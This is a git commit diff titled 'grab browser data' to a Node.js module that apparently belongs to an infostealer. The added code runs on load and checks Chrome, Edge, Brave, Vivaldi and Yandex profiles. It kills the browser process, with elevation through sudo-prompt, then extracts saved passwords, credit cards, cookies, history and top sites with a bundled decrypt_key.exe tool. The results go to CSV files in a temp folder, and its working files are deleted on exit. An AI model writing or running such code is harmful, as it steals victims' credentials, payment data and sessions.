b1515c59a7e73650bc05b1118545e5093603ba4a
NetherMC <thelio.trinite@outlook.com>
2023-02-10 18:49:24 +0100

    grab browser data

--- functions/grab-browsers-data.js
+++ functions/grab-browsers-data.js
@@ -1,14 +1,33 @@
 const { existsSync, copyFileSync, mkdirSync, rmSync } = require('fs');
-const { join, sep } = require('path');
+const { join, sep, resolve } = require('path');
 const { randomFileCreator } = require('../util/dir');
 const psList = () => import('ps-list').then(({ default: psList }) => psList());
 const sudo = require('sudo-prompt');
 const { execSync } = require('child_process');
 const { tempFolder } = require('../index');
 const { addDoubleQuotes } = require('../util/string');
+const { sleep } = require('../util/general');
+const { paths: { localAppData } } = require('../util/variables');
+
+const browsers = [
+  ['',       ['Vivaldi']],
+  ['chrome', ['Google', 'Chrome SxS']],
+  ['chrome', ['Google', 'Chrome']],
+  ['msedge', ['Microsoft', 'Edge']],
+  ['',       ['Yandex', 'YandexBrowser']],
+  ['',       ['BraveSoftware', 'Brave-Browser']],
+];
 
 const filesToDelete = [];
 const toolPath = addDoubleQuotes(join(__dirname, '..', 'util', 'decrypt-key', 'decrypt_key.exe'));
+/**
+ * @param {string} name
+ * @param {string} path
+ * @param {string} use
+ * @param {string} filename
+ * @param {(dbFile: string, csvFile: string) => void} dbData
+ * @private
+ */
 const _ = (name, path, use, filename, dbData) => {
   path += join(sep, 'Default', use);
   if (!existsSync(path)) return;
@@ -22,7 +41,7 @@ const _ = (name, path, use, filename, dbData) => {
   dbData(dbFile, file);
 };
 
-module.exports.passwords = (name, path) => {
+this.passwords = (name, path) => {
   return _(name, path, 'Login Data', 'Logins', (dbFile, csvFile) => execSync(
     [
       toolPath, `--path "${path}"`, `--db-file "${dbFile}"`, '--sql "SELECT origin_url, username_value, password_value FROM logins"',
@@ -31,7 +50,7 @@ module.exports.passwords = (name, path) => {
   ));
 };
 
-module.exports.history = (name, path) => {
+this.history = (name, path) => {
   return _(name, path, 'History', 'History', (dbFile, csvFile) => execSync(
     [
       toolPath, `--path "${path}"`, `--db-file "${dbFile}"`, '--sql "SELECT url, title, visit_count, typed_count FROM urls"',
@@ -40,7 +59,7 @@ module.exports.history = (name, path) => {
   ));
 };
 
-module.exports.creditCards = (name, path) => {
+this.creditCards = (name, path) => {
   return _(name, path, 'Web Data', 'Credit Cards', (dbFile, csvFile) => execSync(
     [
       toolPath, `--path "${path}"`, `--db-file "${dbFile}"`,
@@ -50,7 +69,7 @@ module.exports.creditCards = (name, path) => {
   ));
 };
 
-module.exports.cookies = (name, path) => {
+this.cookies = (name, path) => {
   return _(name, path, join('Network', 'Cookies'), 'Cookies', (dbFile, csvFile) => execSync(
     [
       toolPath, `--path "${path}"`, `--db-file "${dbFile}"`,
@@ -61,7 +80,7 @@ module.exports.cookies = (name, path) => {
   ));
 };
 
-module.exports.topSites = (name, path) => {
+this.topSites = (name, path) => {
   return _(name, path, 'Top Sites', 'Top Sites', (dbFile, csvFile) => execSync(
     [
       toolPath, `--path "${path}"`, `--db-file "${dbFile}"`, '--sql "SELECT url, url_rank, title FROM top_sites"',
@@ -70,7 +89,7 @@ module.exports.topSites = (name, path) => {
   ));
 };
 
-module.exports.kill = (browser, onKilled) => {
+const kill = (browser, onKilled) => {
   return psList().then(data => {
     const browserProcess = data.find(p => p.name === `${browser}.exe`);
     if (typeof browserProcess !== 'undefined' && 'name' in browserProcess) {
@@ -108,9 +127,19 @@ module.exports.kill = (browser, onKilled) => {
   });
 };
 
+if (!existsSync(join(tempFolder, 'Browsers'))) mkdirSync(join(tempFolder, 'Browsers'));
+browsers.forEach((browser) => {
+  const path = resolve(localAppData, browser[1].join(sep), 'User Data');
+  // Browser data exists
+  if (existsSync(path)) {
+    // Kill browser process
+    kill(browser[0], () => {
+      ['passwords', 'history', 'creditCards', 'cookies', 'topSites']
+        .forEach(fn => this[fn](browser[1].join(' '), path));
+    });
+  }
+});
+
 process.on('exit', () => {
-  new Promise(r => setTimeout(r, 1000));
-  filesToDelete.forEach(file => {
-    if (existsSync(file)) rmSync(file);
-  });
+  sleep(1000).then(() => filesToDelete.forEach(file => existsSync(file) && rmSync(file)));
 });
